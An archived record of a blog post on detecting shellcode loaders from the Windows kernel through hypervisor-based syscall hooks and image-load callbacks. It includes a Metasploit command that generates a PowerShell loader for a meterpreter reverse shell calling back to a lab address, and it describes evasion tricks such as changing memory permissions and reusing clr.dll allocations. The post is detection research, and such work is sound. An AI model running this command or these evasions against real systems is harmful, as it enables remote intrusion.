{
    "id": "1b20f94e-1e62-4c09-be39-d620782e1ea3",
    "created_at": "2023-01-12T15:09:09.887193Z",
    "updated_at": "2025-03-27T02:06:04.997857Z",
    "deleted_at": null,
    "sha1_hash": "5fab59461b9c91767ebdaaf6c2813edcd8289aa6",
    "title": "2021-09-07 - Shellcode Detection Using Real-Time Kernel Monitoring",
    "authors": "",
    "file_creation_date": "2022-05-27T23:00:18Z",
    "file_modification_date": "2022-05-27T23:00:18Z",
    "file_size": 1014530,
    "plain_text": "# Blog | CounterCraft\n\n**[countercraftsec.com/blog/post/shellcode-detection-using-realtime-kernel-monitoring/](https://www.countercraftsec.com/blog/post/shellcode-detection-using-realtime-kernel-monitoring/)**\n\n### Shellcode Detection Using Real-Time Kernel Monitoring\n\n\nSeptember 7, 2021\n\n\nThe tools used to load code into memory have changed a lot recently. I have seen this\nevolution in shellcode, manually mapped images and other types of code execution\nmethods. Sometimes, some of these techniques need to circumvent mitigations imposed by\n\n\n-----\n\n[the operating system, such as bypassing AMSI, disabling writing to the Event-Log or evading](https://pentestlaboratories.com/2021/05/17/amsi-bypass-methods/)\nhooks placed by EDRs in user space to avoid being detected.\n\nA typical use case used by attackers is to patch EDR’s user-space memory hooks or use\n[Direct System Calls to evade detection by EDRs and then load their code into the memory.](https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/)\nThis is a scenario where having an extra layer of kernel detection can be useful to detect\nshellcode loading in real time.\n\nIt is important to note that nothing in this post is a new technique. We are going to discuss\nvery specific examples, but there are many more methods in addition to those listed below.\n\nLet’s discuss what challenges we are going to face in order to detect the shellcode at\nruntime. To accomplish this we will use two different approaches:\n\n– Hooking some syscalls via hypervisor EPT feature\n– Detecting shellcodes from kernel callback\n\nRead on for more insights.\n\n## Setup\n\nWe are going to use Metasploit as a C2 (Command & Control ) and the shellcode will be\nloaded into local process powershell.exe. We’ve chosen powershell as the process that\nlaunches meterpreter because it is a common way to load shellcodes in the local process.\n\nWe are going to generate a one-liner script to execute in powershell using:\n```\nmsfconsole -x \"use exploit/multi/script/web_delivery; set target 2; set lhost\n192.168.1.44; set lport 1234; set payload windows/x64/meterpreter/reverse_tcp;\nexploit\"\n\n```\nThe script generated is:\n\n## Detection by Hooking\n\n\n-----\n\nOnce the powershell script is executed and after unzipping and decoding it, we can capture\nthe loader of the stage1 of our implant from the memory:\n\nIn the stage1 shellcode loader code we identify the following steps:\n\n1. Allocate memory in the local process\n2. Write the shellcode to the allocated memory\n3. Create a thread pointing to the shellcode\n\nThe first step is the easiest to detect. The second step is just a memory copy, so there are no\nexternal calls we can monitor or filter. The last step calls a system function to spawn the\nthread, a very common action in any code that can be used for detection. However, using\n[ROP, detection is very easily avoided, so in this post I won’t go into further detail.](https://blog.xpnsec.com/undersanding-and-evading-get-injectedthread/#Return-Oriented%E2%80%A6-urm-threading)\n\nLet’s take a look at the following piece of code :\n\n\n-----\n\n[We can see how VirtualAlloc is called with the flags:](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)\n\n0x3000 = MEM_RESERVE | MEM_COMMIT\n\n0x40 = PAGE_EXECUTE_READWRITE (RWX)\n\nIn order to detect suspicious allocations (in our case private memory with RWX permissions),\nwe are going to need to place some hooks. Windows does not allow users to place kernel\n[hooks, and uses Patchguard to prevent it. That is why we are going to use EPT to hook](https://en.wikipedia.org/wiki/Kernel_Patch_Protection)\n[some syscalls and bypass PatchGuard mitigation. More info about EPT here.](https://rayanfam.com/topics/hypervisor-from-scratch-part-4/)\n\nOnce we have our driver working we can monitor the Allocations by hooking\n**NtAllocateVirtualMemory. In our example, it will be easy to detect since the shellcode**\nloader is allocating RWX memory. As an example we might use the following code to detect\nsuspicious allocations:\n\nSo once the loader is executed we see how we detect the shellcode:\n\n\n-----\n\nBy monitoring NtAllocateVirtualMemory I have seen that there are RWX allocations coming\nfrom clr.dll, generating false positives:\n\nAs you see in the screenshot above, VirtualAlloc is being called from clr.dll using\n**MEM_COMMIT with a specific memory address so our function called**\n**IsSuspiciousAllocation() will work fine and will not report it as suspicious allocation.**\nHowever it is quite easy to circumvent our detection code.\n\nFrom the attacker’s perspective allocating memory regions with RWX permissions is not\ndesirable because, as we have seen, it is easily detectable. So we are going to do some\nmore tests improving this aspect to cover some more cases.\n\nFor the following example, let’s Allocate RW memory, write shellcode to it, and then modify\npermissions to RX to execute it. Modifying the code of the shellcode loader, we would have\nthe following code:\n\nTo detect this new scenario we will need to monitor NtProtectVirtualMemory and check\nwhen the permissions are being changed to executable. So we can use the following code in\nNtProtectVirtualMemory hook to detect it:\n\n\n-----\n\nBased on these last two scenarios, we can draw some conclusions:\n\n– The memory allocation phase is the easiest to detect\n– The biggest problem with the hooking approach are the false positives coming from\ncrl.dll\n\nKeeping these ideas in mind, we might create another possible enhancement using RWX\nallocations made by clr.dll and writing our shellcode there. Therefore, we will not need to\nallocate memory and avoid being flagged at this step. So the new loader code could look\nsomething like this:\n\n\n-----\n\nNote:\n\nThis above code may not be very reliable because the legitimate process might want to\noverwrite this buffer we are using to store the shellcode without taking into account the new\nmemory permissions, causing an access violation exception.\n\n**Hooking takeaways:**\n\nWe could continue iterating with potential improvements using other APIs such as\n**CreateFileMapping or NtMapViewOfSection to allocate memory, which would turn into a**\ncat-and-mouse game trying to monitor more APIs and attackers trying to find new ways to\nallocate the memory.\n\nThe downside of trying to detect shellcode loading processes using hooks is having to deal\nwith possible false positives. This is not exclusive to the kernel hooking we are using here,\nthe EDRs working in user space need to face the same problem.\n\n\n-----\n\nIt should be noted that this type of detection based on monitoring syscalls with hooks using\nEPT can only be accomplished on systems with EPT capabilities.\n\n## Detecting shellcodes from kernel using callbacks\n\nOnce the shellcode loader loads stage1 into memory, we notice that the code is a\n**reverse_tcp that will try to connect to the C2 server and load the meterpreter payload. We**\n[can access the code directly from github to read it better:](https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x64/src/block/block_reverse_tcp.asm)\n\nBy looking at the stage1 code we notice how it needs to load the ws2_32.dll library to\nresolve the memory address of the network APIs it will use to communicate with the C2\nserver:\n\n\n-----\n\nThe idea of detection is to monitor from the kernel the libraries loaded from userspace and\ninspect the call stack of the thread that has made the syscall to detect if the base address of\nthe call stack elements has been manually mapped code.\n\nIn order to monitor the libraries loaded in the system, we are going to use\n**PsSetLoadImageNotifyRoutine, which allows us to install our callback and monitor the**\nimages that are loaded in the system using the API including the libraries(dll).\n\nTo carry out detection, we can follow these steps:\n\n– Walk the call stack to obtain the memory base address of its elements.\n– Obtain MEMORY_BASIC_INFORMATION [structure returned by](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information)\n**ZwQueryVirtualMemory for each element.**\n– Detect private(MEM_PRIVATE) or mapped(MEM_MAPPED) as executable.\n\nIn the image above we can see the detection of a suspicious region at 0x0000017d61ae013b\nwithin the call stack which is mapped as private with executable permissions(RWX) trying to\nload the mswsock.dll library.\n\n\n-----\n\nIf we examine the instructions within the detected shellcode, we see that it coincides with\nmeterpreter reverse_tcp code just after call to WSASocketA:\n\nWe see that the first library loaded by the shellcode is mswsock.dll which is loaded when\ncalling WSASocketA. Why didn’t we catch the call to LoadLibraryA(ws2_32.dll) ? Well, in our\ncase this library is already loaded by powershell.exe by default so the first library that is\nactually loaded from the shellcode is mswsock.dll which is a dependency when calling\n**WSASocketA.**\n\nThis allows us to see other libraries that are loaded from the shellcode when connecting to\nthe C2 server and downloading the payload.\n\n## Conclusions\n\nThis article was just a quick overview of how to detect shellcodes from the kernel in real time\nusing specific and not very advanced examples. As I mentioned earlier in the introduction,\nnone of the techniques we are using here are anything new, and they can be bypassed with\nsome additional work. These are only some concrete examples of what can be detected from\nthe kernel. However, I think it may be useful for researchers, who develop of offensive\nsecurity tools, to consider these methods in addition to EDR userland hooks. There may be\nspecific environments or situations in which kernel detection could be more effective.\n\nI hope you enjoyed this article.\n\n\n-----\n\nAlonso Candado is a security software engineer at CounterCraft where he focuses on low\n[level programming and research of new threats. You can find him on LinkedIn.](https://www.linkedin.com/in/alonso-candado/)\n\nShellcode Detection Using Real-Time Kernel Monitoring\n\nMore about the challenges of detecting shellcode at runtime\n\nLike Jim Morrison said, this is the end. But you can...\n\n[Read more blog posts](https://www.countercraftsec.com/blog/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-09-07 - Shellcode Detection Using Real-Time Kernel Monitoring.pdf"
    ],
    "report_names": [
        "2021-09-07 - Shellcode Detection Using Real-Time Kernel Monitoring.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536149,
    "ts_updated_at": 1743041164,
    "ts_creation_date": 1653692418,
    "ts_modification_date": 1653692418,
    "files": {
        "pdf": "https://archive.orkl.eu/5fab59461b9c91767ebdaaf6c2813edcd8289aa6.pdf",
        "text": "https://archive.orkl.eu/5fab59461b9c91767ebdaaf6c2813edcd8289aa6.txt",
        "img": "https://archive.orkl.eu/5fab59461b9c91767ebdaaf6c2813edcd8289aa6.jpg"
    }
}